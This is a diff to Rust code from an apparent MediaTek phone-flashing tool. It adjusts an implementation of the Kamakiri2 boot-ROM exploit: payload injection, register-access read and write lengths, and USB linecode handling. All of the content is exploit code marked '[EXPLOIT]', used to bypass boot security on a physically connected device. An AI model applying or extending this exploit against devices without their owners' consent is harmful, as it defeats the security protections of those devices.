@@ -46,7 +46,7 @@ impl Preloader {
             let mut d = lc.to_vec();
             d.extend(&addr.to_le_bytes());
             self.device.ctrl_transfer_out(0x21, 0x20, 0, 0, &d)?;
-            let _ = self.device.ctrl_transfer_in(0x80, 0x06, 0x02FF, 0, 9);
+            // 不执行 ctrl_transfer_in，对齐刷机匣行为
         } else {
             // 串口路径：NO-OP（对齐刷机匣行为 — 跳过 setup steps）
             debug!("[STEP] serial mode — skipping kamakiri2 setup step");
@@ -80,12 +80,12 @@ impl Preloader {
         if !self.device.is_libusb() {
             self.da_setup(lc, ptr_da_bra, watchdog)?;
             if addr < 0x40 {
-                let r = self.brom_register_access(addr, len, None, true)?;
+                let r = self.brom_register_access(addr, len / 4, None, true)?;
                 Ok(r.unwrap_or_default())
             } else {
                 let bra_addr = addr.wrapping_sub(0x40);
                 debug!("[da_read] bra_addr=0x{:08X}", bra_addr);
-                let r = self.brom_register_access(bra_addr, len, None, true)?;
+                let r = self.brom_register_access(bra_addr, len / 4, None, true)?;
                 Ok(r.unwrap_or_default())
             }
         } else {
@@ -97,7 +97,7 @@ impl Preloader {
                 self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_sub(1))?;
                 self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_add(0))?;
                 self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_add(1))?;
-                let r = self.brom_register_access(addr, len, None, true)?;
+                let r = self.brom_register_access(addr, len / 4, None, true)?;
                 Ok(r.unwrap_or_default())
             } else {
                 self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_sub(2))?;
@@ -105,7 +105,7 @@ impl Preloader {
                 self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_add(0))?;
                 let bra_addr = addr.wrapping_sub(0x40);
                 debug!("[da_read] bra_addr=0x{:08X}", bra_addr);
-                let r = self.brom_register_access(bra_addr, len, None, true)?;
+                let r = self.brom_register_access(bra_addr, len / 4, None, true)?;
                 Ok(r.unwrap_or_default())
             }
         }
@@ -134,14 +134,14 @@ impl Preloader {
             self.da_setup(lc, ptr_da_bra, watchdog)?;
             if addr < 0x40 {
                 debug!("[da_write] bra_addr=0x{:08X} (no offset)", addr);
-                self.brom_register_access(addr, data.len() as u32, Some(data), check_status)?;
+                self.brom_register_access(addr, (data.len() / 4) as u32, Some(data), check_status)?;
                 Ok(())
             } else {
                 let bra_addr = addr.wrapping_sub(0x40);
                 debug!("[da_write] bra_addr=0x{:08X} (addr-0x40)", bra_addr);
                 self.brom_register_access(
                     bra_addr,
-                    data.len() as u32,
+                    (data.len() / 4) as u32,
                     Some(data),
                     check_status,
                 )?;
@@ -158,7 +158,7 @@ impl Preloader {
                 self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_add(0))?;
                 self.kamakiri2_step(lc, ptr_da_bra, ptr_da_bra.wrapping_add(1))?;
                 debug!("[da_write] bra_addr=0x{:08X} (no offset)", addr);
-                self.brom_register_access(addr, data.len() as u32, Some(data), check_status)?;
+                self.brom_register_access(addr, (data.len() / 4) as u32, Some(data), check_status)?;
                 Ok(())
             } else {
                 // addr >= 0x40: 3 steps, ptr_da_bra - 2, -1, 0 (原逻辑 ptr_da_bra - 5 + (3 - i), i=0..3)
@@ -169,7 +169,7 @@ impl Preloader {
                 debug!("[da_write] bra_addr=0x{:08X} (addr-0x40)", bra_addr);
                 self.brom_register_access(
                     bra_addr,
-                    data.len() as u32,
+                    (data.len() / 4) as u32,
                     Some(data),
                     check_status,
                 )?;
@@ -193,7 +193,7 @@ impl Preloader {
     fn inject_payload(&mut self, payload: &[u8], expected_ack: u32) -> Result<(), String> {
         let chip = self.chip.ok_or_else(|| "未识别的处理器型号".to_string())?;
         let ptr_da_bra = self.ptr_da_bra();
-        let ptr_da = chip.brom_register_access.0;
+        let ptr_da = chip.brom_register_access.1;  // 对齐 Python: brom_register_access[0][1]
 
         debug!("[inject] payload_size={}", payload.len());
         debug!(
@@ -201,16 +201,19 @@ impl Preloader {
             ptr_da_bra, ptr_da
         );
 
-        // linecode：libusb 通过 ctrl_transfer，串口使用全零（Kamakiri2 serial 路径不依赖 linecode）
+        // linecode：libusb 通过 ctrl_transfer 动态获取，串口使用全零（Kamakiri2 serial 路径不依赖 linecode）
         let linecode = if self.device.is_libusb() {
             info!("[EXPLOIT] using libusb backend — Kamakiri2 via ctrl_transfer");
-            self.device.ctrl_transfer_in(0xA1, 0x21, 0, 0, 7)?
+            // 从设备读取 linecode（对齐 b9d7440 版本）
+            let linecode = self.device.ctrl_transfer_in(0xA1, 0x21, 0, 0, 7)?;
+            let mut lc = linecode;
+            lc.push(0);  // 补齐到 8 字节
+            lc
         } else {
             info!("[EXPLOIT] using serial backend — Kamakiri2 via brom_register_access");
-            vec![0u8; 7]
+            vec![0u8; 8]
         };
-        let mut lc = linecode.to_vec();
-        lc.push(0);
+        let lc = linecode;
         debug!("[inject] linecode={:02X?}", lc);
 
         let ptr_send = self.read_payload_address(&lc, ptr_da_bra, ptr_da, chip.watchdog)?;
